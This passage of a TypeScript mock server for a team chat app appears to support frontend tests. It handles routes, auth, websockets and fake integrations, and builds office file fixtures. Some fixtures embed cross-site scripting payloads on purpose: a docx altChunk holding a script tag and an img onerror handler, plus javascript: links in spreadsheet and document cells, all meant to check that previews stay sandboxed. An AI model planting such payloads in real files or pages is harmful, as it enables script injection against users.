      if (!h) return fail('not_found', 404, `mock: ${route.name} not implemented`)
      if (req.method !== 'GET' && !req.headers.get(CSRF_HEADER)) fail('csrf', 403)
      const ep = route.ep as Endpoint
      const user = this.userOf(req)
      if (ep.auth !== 'public') {
        if (!user) fail('unauthorized', 401)
        if ((ep.auth === 'admin' && user!.role === 'member') || ((ep.auth === 'owner' || ep.auth === 'owner-reauth') && user!.role !== 'owner')) fail('forbidden', 403)
        // like the server: a temporary password reaches only the endpoints that change it
        if (user!.mustChangePassword && !ep.allowWhilePasswordChange) fail('password_change_required', 403)
      }
      const params = Object.fromEntries(Object.entries(route.re.exec(p)!.groups ?? {}).map(([k, v]) => [k, decodeURIComponent(v)]))
      const query = Object.fromEntries(url.searchParams.entries())
      if (ep.query && isSchema(ep.query)) {
        const q = ep.query.safeParse(query)
        if (!q.success) fail('validation', 400, JSON.stringify(q.error.issues))
      }
      let body: any
      let file: File | undefined
      if (ep.body && isSchema(ep.body)) {
        const parsed = (ep.body as z.ZodType).safeParse(await req.json())
        if (!parsed.success) fail('validation', 400, JSON.stringify(parsed.error.issues))
        body = parsed.data
      } else if (ep.body && (ep.body as { kind: string }).kind === 'multipart') {
        const fd = await req.formData()
        const fields: Json = {}
        for (const [k, v] of fd.entries()) if (typeof v === 'string') fields[k] = v
        const parsed = (ep.body as { fields: z.ZodType }).fields.safeParse(fields)
        if (!parsed.success) fail('validation', 400, JSON.stringify(parsed.error.issues))
        body = parsed.data
        file = fd.get('file') as File
      }
      const out = await h({ user: user!, params, query, body, req, file })
      if (out instanceof Response) return out
      const o = (out && typeof out === 'object' && ('body' in (out as Json) || 'cookie' in (out as Json)) && !('id' in (out as Json)) ? out : { body: out }) as { status?: number; body: unknown; cookie?: string }
      const status = o.status ?? ep.status ?? 200
      const headers: Record<string, string> = { 'content-type': 'application/json' }
      if (o.cookie) headers['set-cookie'] = o.cookie
      if (status === 204 || (!isSchema(ep.response) && (ep.response as { kind: string }).kind === 'empty')) return new Response(null, { status: 204, headers: o.cookie ? { 'set-cookie': o.cookie } : {} })
      // the mock must speak the contract exactly: a mismatch here is a bug in the mock or the contract changed
      const checked = (ep.response as z.ZodType).parse(o.body)
      return new Response(JSON.stringify(checked), { status, headers })
    } catch (e) {
      if (e instanceof Fail) return new Response(JSON.stringify(ApiErrorResponse.parse({ error: { code: e.code, message: e.message, ...(e.fields ? { fields: e.fields } : {}), ...(e.params ? { params: e.params } : {}) } })), { status: e.status, headers: { 'content-type': 'application/json' } })
      console.error('mock error', req.method, p, e)
      return new Response(JSON.stringify({ error: { code: 'internal', message: String(e) } }), { status: 500, headers: { 'content-type': 'application/json' } })
    }
  }

  async testControl(p: string, req: Request): Promise<Response> {
    const body = (await req.json().catch(() => ({}))) as Json
    if (p === '/__test/reset') this.reset({ setup: !!body.setup, teamLocale: Locale.safeParse(body.teamLocale).data, usersFollowTeam: !!body.usersFollowTeam, mustChange: typeof body.mustChange === 'string' ? body.mustChange : undefined })
    else if (p === '/__test/drop-ws') for (const ws of this.sockets) ws.close(WsClose.serviceRestart, 'restart')
    else if (p === '/__test/server-version') this.serverVersion = String(body.version)
    else if (p === '/__test/cloud') this.cloud = body.on !== false
    else if (p === '/__test/memory') this.memories.push({ id: uuidv7(), text: String(body.text), sourceChatId: null, createdAt: now() })
    else if (p === '/__test/log') return Response.json(this.log)
    else if (p === '/__test/engine-requests') return Response.json(this.engineRequests)
    else if (p === '/__test/member-choice') this.memberChoice = MemberEngineChoice.parse(body)
    else if (p === '/__test/queue') {
      const chatId = String(body.chatId), position = Number(body.position)
      const assistant = this.messages.find(m => m.chatId === chatId && m.status === 'streaming')
      if (!assistant?.turnId || !Number.isInteger(position) || position < 0) return Response.json({ ok: false }, { status: 400 })
      this.queuePositions.set(chatId, position)
      this.publish({ type: 'queue.position', data: { chatId, messageId: assistant.id, turnId: assistant.turnId, position, epoch: this.epoch, revision: ++this.queueRevision } })
    }
    else if (p === '/__test/revoke') {
      // like the server after a folder-rule change: the folder is gone for everyone, who get an access_changed notice
      this.revoked.add(String(body.path))
      this.publish({ type: 'notice', data: { level: 'info', code: 'access_changed', message: String(body.path) } })
    }
    return Response.json({ ok: true })
  }

  serve(port: number, dist: string) {
    const self = this
    return Bun.serve<WsData, never>({
      port,
      hostname: '127.0.0.1',
      async fetch(req, server) {
        const url = new URL(req.url)
        if (url.pathname === WS_PATH) {
          const user = self.userOf(req)
          const after = url.searchParams.get('after')
          const data: WsData = { user: user?.id ?? '', windowId: url.searchParams.get('windowId') ?? '', epoch: url.searchParams.get('epoch'), after: after === null ? null : Number(after) }
          const ok = server.upgrade(req, { data, headers: { 'sec-websocket-protocol': 'mycel.v1' } })
          return ok ? undefined : new Response('upgrade failed', { status: 400 })
        }
        return self.handle(req, dist)
      },
      websocket: {
        open(ws) {
          if (!ws.data.user) return ws.close(WsClose.unauthorized, 'sign in')
          self.sockets.add(ws)
          const hello = (resumed: boolean) => JSON.stringify({ type: 'hello', epoch: self.epoch, seq: self.seq, resumed, windowId: ws.data.windowId, serverVersion: self.serverVersion, pingIntervalMs: 20000 })
          const { epoch, after } = ws.data
          if (epoch && epoch !== self.epoch) {
            ws.send(hello(false))
            ws.send(JSON.stringify({ type: 'reset', epoch: self.epoch, seq: self.seq, reason: 'epoch_mismatch' }))
          } else if (epoch && after !== null) {
            const oldest = self.buffer[0]?.seq ?? self.seq + 1
            if (after + 1 < oldest) {
              ws.send(hello(false))
              ws.send(JSON.stringify({ type: 'resync', epoch: self.epoch, seq: self.seq, reason: 'buffer_overflow' }))
            } else {
              ws.send(hello(true))
              for (const b of self.buffer) if (b.seq > after) ws.send(b.text)
            }
          } else ws.send(hello(false))
        },
        message(ws, msg) {
          const f = JSON.parse(String(msg)) as { type: string; t?: number }
          if (f.type === 'ping') ws.send(JSON.stringify({ type: 'pong', t: f.t ?? 0 }))
        },
        close(ws) {
          self.sockets.delete(ws)
        },
      },
    })
  }
}

function mimeOf(path: string): string | null {
  const e = path.toLowerCase().split('.').pop() ?? ''
  return ({ md: 'text/markdown', csv: 'text/csv', txt: 'text/plain', html: 'text/html', png: 'image/png', jpg: 'image/jpeg', pdf: 'application/pdf', json: 'application/json' } as Record<string, string>)[e] ?? null
}

type MockIntegration = Omit<Integration, 'hasSecret' | 'canManage'> & { ownerId: string | null; checks: number }
const NO_ACCESS: IntegrationAccess = { everyone: false, groups: [], users: [] }
/** what the fake MCP server offers: two tools at first, a third once it is checked again */
const FAKE_MCP_TOOLS: IntegrationTool[] = [
  { name: 'search_pages', title: 'Search pages', description: 'Find pages by words in their title or text.', readOnly: true },
  { name: 'create_page', title: 'Create page', description: 'Create a new page in a workspace.', readOnly: false },
  { name: 'get_page', title: null, description: 'Read one page with its blocks.', readOnly: true },
]
/** like server/src/web-fetch.ts resolveTarget (by name only here): this computer and office networks are refused */
const privateHost = (h: string) => h === 'localhost' || h.endsWith('.localhost') || h.endsWith('.local') || h.endsWith('.internal') || /^(127|10)\./.test(h) || /^192\.168\./.test(h) || /^172\.(1[6-9]|2\d|3[01])\./.test(h) || h === '[::1]'

function defaultSettings(): TeamSettings {
  return { teamName: 'Acme', defaultLocale: 'ko', defaultEngine: 'claude-code', defaultModel: null, concurrency: 2, updateChannel: 'stable', updateWindow: null, auditRetentionDays: 365, fileHistoryRetentionDays: 90, trashRetentionDays: 30, chatTrashRetentionDays: 7, timeZone: 'Asia/Seoul', browserAllowAll: true, personalIntegrations: true, aiVision: true, speechProvider: 'local', speechModel: 'openai/whisper-large-v3-turbo' }
}

/** What the real server's securityHeaders() middleware adds to every non-/api response (server/src/http/middleware.ts). */
function pageHeaders(res: Response): Response {
  const h = new Headers(res.headers)
  h.set('X-Content-Type-Options', 'nosniff')
  h.set('Referrer-Policy', 'same-origin')
  h.set('X-Frame-Options', 'DENY')
  h.set('Cross-Origin-Opener-Policy', 'same-origin')
  return new Response(res.body, { status: res.status, headers: h })
}

/** pandoc's docx with an altChunk (an HTML part docx-preview would draw in an unsandboxed srcdoc iframe). */
function withAltChunk(docx: string): boolean {
  const dir = `${docx}.d`
  try {
    fs.rmSync(dir, { recursive: true, force: true })
    if (Bun.spawnSync(['unzip', '-q', docx, '-d', dir]).exitCode !== 0) return false
    fs.writeFileSync(`${dir}/word/chunk.html`, '<html><body><p>alt chunk</p><script>top.document.title = "pwned-altchunk"</script><img src="x" onerror="top.document.title = \'pwned-altchunk\'"></body></html>')
    const doc = `${dir}/word/document.xml`
    fs.writeFileSync(doc, fs.readFileSync(doc, 'utf8').replace('</w:body>', '<w:altChunk r:id="rIdAlt1"/></w:body>').replace(/(<w:sectPr[\s\S]*?<\/w:sectPr>)(<w:altChunk r:id="rIdAlt1"\/>)/, '$2$1'))
    const rels = `${dir}/word/_rels/document.xml.rels`
    fs.writeFileSync(rels, fs.readFileSync(rels, 'utf8').replace('</Relationships>', '<Relationship Id="rIdAlt1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk" Target="chunk.html"/></Relationships>'))
    const types = `${dir}/[Content_Types].xml`
    fs.writeFileSync(types, fs.readFileSync(types, 'utf8').replace('</Types>', '<Override PartName="/word/chunk.html" ContentType="text/html"/></Types>'))
    fs.rmSync(docx)
    return Bun.spawnSync(['zip', '-q', '-r', '-X', docx, '.'], { cwd: dir }).exitCode === 0
  } finally {
    fs.rmSync(dir, { recursive: true, force: true })
  }
}

let office: [string, Uint8Array][] | null = null
/** PDF / xlsx / docx / pptx samples for the preview tests (docx and pptx need pandoc; skipped without it). */
function officeFixtures(): [string, Uint8Array][] {
  if (office) return office
  const out: [string, Uint8Array][] = [['docs/handbook.pdf', makePdf(['Company Handbook 2026', 'Section 1: Working hours are flexible.'])]]
  // PDFs pdf.js can only draw with its data files (web/src/lib/pdfjs-assets.ts): Korean text in a font the file does
  // not embed, a fax-style scan (CCITT) and a JPEG 2000 scan
  out.push(['docs/quote-form.pdf', makeCidPdf(['견적서 2026', '공급가액 합계 1,500,000원'])])
  out.push(['docs/scan-fax.pdf', makeImagePdf(CCITT_SCAN)])
  out.push(['docs/scan-jpeg2000.pdf', makeImagePdf(JPX_SCAN)])
  const wb = XLSX.utils.book_new()
  XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet([['month', 'spend'], ['July', 1200], ['August', 900]]), 'Q3 spend')
  out.push(['docs/spend.xlsx', new Uint8Array(XLSX.write(wb, { type: 'array', bookType: 'xlsx' }) as ArrayBuffer)])
  // a sheet whose cells link to javascript: and to a web page
  const links = XLSX.utils.aoa_to_sheet([['evil cell', 'web cell']])
  links.A1!.l = { Target: 'javascript:top.document.title="pwned-xlsx"' }
  links.B1!.l = { Target: 'https://example.com/sheet' }
  const wb2 = XLSX.utils.book_new()
  XLSX.utils.book_append_sheet(wb2, links, 'links')
  out.push(['docs/links.xlsx', new Uint8Array(XLSX.write(wb2, { type: 'array', bookType: 'xlsx' }) as ArrayBuffer)])
  const docs = [
    ['brand.docx', 'docx', '# Brand guidelines\n\nPrimary color: mint.\n'],
    ['kickoff.pptx', 'pptx', '# Q4 kickoff\n\n- Launch in November\n'],
    ['links.docx', 'docx', '# Links\n\n[evil link](javascript:top.document.title="pwned-docx") and [web link](https://example.com/doc) and [app link](/admin/members)\n'],
  ] as const
  for (const [name, to, md] of docs) {
    try {
      const tmp = `${process.env.TMPDIR ?? '/tmp'}/mycel-mock-${process.pid}-${name}`
      const p = Bun.spawnSync(['pandoc', '-f', 'markdown', '-t', to, '-o', tmp], { stdin: enc.encode(md) })
      if (p.exitCode === 0 && (name !== 'links.docx' || withAltChunk(tmp))) {
        out.push([`docs/${name}`, new Uint8Array(fs.readFileSync(tmp))])
        fs.rmSync(tmp, { force: true })
      }
    } catch { /* no pandoc: no docx/pptx sample */ }
  }
  return (office = out)
}
